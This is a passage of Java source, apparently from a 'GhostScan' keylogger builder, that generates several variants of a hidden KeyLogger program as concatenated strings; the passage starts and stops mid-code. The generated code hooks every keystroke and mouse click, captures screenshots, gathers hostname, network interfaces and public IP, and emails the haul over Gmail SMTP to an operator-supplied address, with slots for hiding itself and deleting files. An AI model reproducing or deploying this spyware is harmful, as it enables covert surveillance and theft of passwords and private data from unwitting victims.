								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											+"try{"
											+"Robot robot = new Robot();"  
											            
											+"Toolkit toolkit = Toolkit.getDefaultToolkit();"  
											+"final Dimension dimension = toolkit.getScreenSize();"  
											             
											                 
											+"BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, dimension.width, dimension.height));"  
											+"try{"
											+"ImageIO.write(bi, "+'"'+"JPEG"+'"'+", new File("+'"'+"camera.JPEG"+'"'+"));"
											+"}catch(IOException ey){"
											+"ey.printStackTrace();"
											+"}"
											           
											+"}catch (AWTException e1) {"
														
											+"e1.printStackTrace();"
											+"}"
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"EmailAttachment anexo = new EmailAttachment();"
										+"anexo.setPath("+'"'+"camera.JPEG"+'"'+");"
										+"anexo.setDisposition(EmailAttachment.ATTACHMENT);"
										+"anexo.setName("+'"'+"camera.JPEG"+'"'+");"
												+"try {"
												+"email.attach(anexo);"
												+"} catch (EmailException e1) {"
										
											+"e1.printStackTrace();"
											+"}"
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
+init   
								    
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile							
+ocult								
						


									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					
					
					String codigoIpRed = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
											
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"<br><br><br><b>"+'"'+"+info+"+'"'+"</b><br>"+'"'+"+computerName+"+'"'+"<br><b>"+'"'+"+placa+"+'"'+"</b><br><b>"+'"'+"+rede+"+'"'+"</b><br><br><font color='red'>"+'"'+"+iface1+"+'"'+"</font><br><font color='green'><i>"+'"'+"+address1+"+'"'+"</i></font><br><font color='blue'>"+'"'+"+bc1+"+'"'+"</font><br><font color='gray'>"+'"'+"+mask1+"+'"'+"</font></p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
								    
								    
+init		
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile							
+ocult				


									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoIp = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
								+"public void nativeMouseClicked(NativeMouseEvent es) {"
									
								+"}"
								+"public void nativeKeyPressed(NativeKeyEvent e) {	"
								+"numberKeys = numberKeys + 1;"
									+conditionKey
									+"varchar += var;"
									+"}"
								
								+"public void nativeKeyReleased(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeKeyTyped(NativeKeyEvent e) {"
									
								+"}"
								+"public void nativeMousePressed(NativeMouseEvent es) {"
									
									
									+"mou = es.getPoint();"
									+"double positionx = mou.getX();"
									+"double positiony = mou.getY();"
									+"String position = null;"
									+"String position1 = null;"
									+"if(positionx < 70 & positiony < 70){"
										+"position = "+'"'+"canto esquerdo(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx < 170 & positiony > 600){"
										+"position = "+'"'+"canto esquerdo(Rodapé),"+'"'+";"
										+"position1 = "+'"'+"(rodapé, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx < 170 & positiony > 190){"
										+"position = "+'"'+"lateral esquerda,"+'"'+";"
										+"position1 = "+'"'+"(meio, esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
										+"if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao topo e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"			
									+"if(positionx > 270 & positiony > 400 & positionx < 400){"
										+"position = "+'"'+"Centro da página,"+'"'+";"
										+"position1 = "+'"'+"(meio, próximo ao rodapé e esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 170 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à esquerda)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									+"if(positionx > 400 & positiony < 190){"
										+"position = "+'"'+"Topo da página(cabeçalho),"+'"'+";"
										+"position1 = "+'"'+"(topo, próximo à direita)"+'"'+";"
										+"mouse += position+position1;"
										+"}"
									
										
						+"}"
								
								
						+"public static void main(String[] args) throws EmailException, IOException{"
						+"new Thread(new Runnable(){"
						+"@Override "
						+"public void run(){"
							+"while(true){"		
							+"if(click || numberKeys == 5){"
							
										+"HtmlEmail email = new HtmlEmail();"
										+"try{"
										+"email.setHostName("+'"'+"smtp.gmail.com"+'"'+");"
										+"email.setSmtpPort(465);"
										+ "email.addTo("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
										+ "email.setFrom("+'"'+campoemail.getText()+'"'+", "+'"'+"X"+'"'+");"
											+"email.setDebug(true);"
											+"email.setSSLOnConnect(true);"
									
											
											+"List list = new ArrayList();"
											
											+"String info = "+'"'+"Obtendo Informacões da Rede:"+'"'+";"
											
											+"InetAddress addr = null;"
											+"try {"
												+"addr = InetAddress.getLocalHost();"
												+"} catch (UnknownHostException e1) {"
											
												+"e1.printStackTrace();"
												+"}"
										    +"byte[] ipAddr = addr.getAddress();"
										    +"String hostname = addr.getHostName();"
										    
											+"String computerName = "+'"'+"Nome do Computador completo: "+'"'+"+ hostname;"
										    
										    +"InetAddress localHost = null;"
										    +"try {"
										    +"localHost = Inet4Address.getLocalHost();"
										    +"} catch (UnknownHostException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    +"NetworkInterface networkInterface = null;"
										    +"try {"
										    +"networkInterface = NetworkInterface.getByInetAddress(localHost);"
										    +"} catch (SocketException e1) {"
												
											+"e1.printStackTrace();"
											+"}"
										    
											+"String placa = "+'"'+"Placa: "+'"'+"+ networkInterface.getDisplayName();"
										    
											+"String rede = "+'"'+"Rede: "+'"'+" + networkInterface.getInterfaceAddresses();"
										      
										      +"String address1 = null, iface1 = null, bc1 = null, mask1 = null;"
										      +"String infoRede = null;"
										      +"Enumeration ifaces = null;"
										      +"try {"
										      +"ifaces = NetworkInterface.getNetworkInterfaces();"
										      +"} catch (SocketException e1) {"


												+"e1.printStackTrace();"
												+"}"
												+"while (ifaces.hasMoreElements()) {"
												+"NetworkInterface iface = (NetworkInterface)ifaces.nextElement();"
												+"String face = "+'"'+"Obtendo Informacões da interface: "+'"'+"+ iface.getName();"
												+"iface1 += face+"+'"'+"<br>"+'"'+";"
										        
										        +"for (InterfaceAddress address : iface.getInterfaceAddresses())"
										        +"{"
										        	
										+"String ipAddress = "+'"'+"IP........: "+'"'+" + address.getAddress().toString();"
										          +"address1 += ipAddress+"+'"'+"<br>"+'"'+";"
										          
										          
										          +"String bc = "+'"'+"Broadcast.: "+'"'+" + address.getBroadcast();"
										        	  +"bc1 += bc+"+'"'+"<br>"+'"'+";"
										          
										   
										          +"String mask = "+'"'+"Máscara...: "+'"'+" + address.getNetworkPrefixLength();"
										        	  +" mask1 += mask+"+'"'+"<br>"+'"'+";"
										        	  +"}"
										        
											
											+"}"
											
										      
										      
										     
										            
										        
											+"String getIp = getIP();"
											
									           
									+"StringBuilder builder = new StringBuilder();"
									+"builder.append("+'"'+"<html>"+'"'
													+'+'+'"'+"<body>"+'"'
													+'+'+'"'+"<h1>GhostScan - "+'"'+"+getDateTime()+"+'"'+"-"+'"'+"+hostname+"+'"'+"</h1>"+'"'
													
													+'+'+'"'+"<p><font color='blue'>ip: </font>"+'"'+"+getIP()+"+'"'+"</p><p><font color='green'>teclado: </font> "+'"'+"+varchar+"+'"'+"</p>"+'"'
													+'+'+'"'+"</body>"+'"'
													+'+'+'"'+"</html>"+'"'+");"
													
													+"email.setMsg(builder.toString());"
											
												
													+"}"
													+"catch (EmailException e1) {"
													+"e1.printStackTrace();"
													+"}"  
										
										
										+"email.setSubject("+'"'+"GhostScan"+'"'+");"
										+"email.setSSL(true);"
										+"email.setAuthentication(  "+'"'+campoemail.getText()+'"'+", "+'"'+senha.getText()+'"'+");"
												+"try {"
											
						+"email.send();"
						+"}" 
						+"catch (EmailException e1) {"
						+"e1.printStackTrace();"
							+"}"
							+"numberKeys = 0;"
							+"click = false;"
							
						+"}"
							
						+"}"
						+"}"
						+"}).start();"			
									
+init   
+"Date date = new Date();"
+"String strDate = DateFormat.getDateInstance(DateFormat.MEDIUM).format(date);"
+delfile						    
									
+ocult						


								    
									
								+"try {"
								+"GlobalScreen.registerNativeHook();"
									+"} "
									+"catch (NativeHookException ex) {"

									+"System.err.println(ex.getMessage());"
										+"System.exit(1);"
										+"}"
										
										+"try {"
										
										+"global.registerNativeHook();"
										+"global.addNativeKeyListener(new KeyLogger());"
										+"global.addNativeMouseListener(new KeyLogger());"
										+"} catch (NativeHookException e) {"
											+"e.printStackTrace();"
										+"System.exit(1);"
										+"}"
									+"}"
									+"}";
					
					String codigoSrc = "package key;"
							+ "import java.awt.AWTException;"
							+ "import java.awt.Dimension;"
							+"import java.awt.Point;"
							+"import java.awt.Rectangle;"
							+"import net.jimmc.jshortcut.JShellLink;"
							+"import java.awt.Robot;"
							+"import java.awt.Toolkit;"
							+"import java.io.BufferedReader;"
							+"import java.io.BufferedWriter;"
							+"import java.io.File;"
							+"import java.io.FileWriter;"
							+"import java.awt.image.BufferedImage;"
							+"import java.io.BufferedReader;"
							+"import java.io.File;"
							+"import java.io.IOException;"
							+"import java.io.InputStreamReader;"
							+"import java.net.Inet4Address;"
							+"import java.net.InetAddress;"
							+"import java.net.InterfaceAddress;"
							+"import java.net.NetworkInterface;"
							+"import java.net.SocketException;"
							+"import java.net.URL;"
							+"import java.net.UnknownHostException;"
							+"import java.util.ArrayList;"
							+"import java.util.Enumeration;"
							+"import java.util.List;"
							+"import javax.imageio.ImageIO;"
							+"import org.apache.commons.mail.DefaultAuthenticator;"
							+"import org.apache.commons.mail.EmailAttachment;"
							+"import org.apache.commons.mail.EmailException;"
							+"import org.apache.commons.mail.HtmlEmail;"
							+"import org.jnativehook.GlobalScreen;"
							+"import org.jnativehook.NativeHookException;"
							+"import org.jnativehook.keyboard.NativeKeyEvent;"
							+"import org.jnativehook.keyboard.NativeKeyListener;"
							+"import org.jnativehook.mouse.NativeMouseEvent;"
							+"import org.jnativehook.mouse.NativeMouseInputListener;"
							+"import java.util.Date;"
							+"import java.text.DateFormat;"
							+"import java.text.SimpleDateFormat;"
							+"public class KeyLogger implements NativeMouseInputListener, NativeKeyListener {"
							+"private static Point mou;"
							+"private static String mouse;"
								+"private static String var;"
								+"private static String varchar = "+'"'+'"'+";"+"private static GlobalScreen global;"
								+"private static boolean click = false;"
								+"private static int numberKeys = 0;"
								
+"private static String getDateTime() {"
+"DateFormat dateFormat = new SimpleDateFormat("+'"'+"dd/MM/yyyy HH:mm:ss"+'"'+");" 
+"Date date = new Date();" 
+"return dateFormat.format(date);" 
+"}"

								+"private static String getIP(){"
								+"String ip = "+'"'+"Não definido"+'"'+";"
								+"try {"
										+"URL whatismyip = new URL("+'"'+"http://checkip.amazonaws.com"+'"'+");"
											+"BufferedReader in = null;"        
							        	+"in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));"
							        	+"ip = in.readLine();"
							        	+"} catch (IOException e) {}"
							        +"return ip;"
							        +"}"
							        
								+"public void nativeMouseReleased(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								
								+"public void nativeMouseDragged(NativeMouseEvent arg0) {"
								+"click = true;"
								+"}"
								+"public void nativeMouseMoved(NativeMouseEvent es) {"
									
								+"}"
								
